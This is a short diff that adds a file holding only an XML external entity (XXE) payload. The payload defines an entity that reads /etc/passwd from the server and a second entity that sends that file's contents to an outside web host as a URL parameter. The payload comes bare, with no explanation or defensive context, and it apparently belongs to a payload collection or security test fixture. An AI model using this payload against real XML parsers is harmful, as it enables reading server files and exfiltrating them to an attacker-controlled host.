@@ -1,0 +1,7 @@
+<!DOCTYPE    html[
+<!ENTITY %data SYSTEM "file:///etc/passwd">
+<!ENTITY %xxe "<!ENTITY ev SYSTEM 'http://security-server.herokuapp.com/kekeke/write?y=%data;'>
+">
+%data;
+%xxe;
+]>
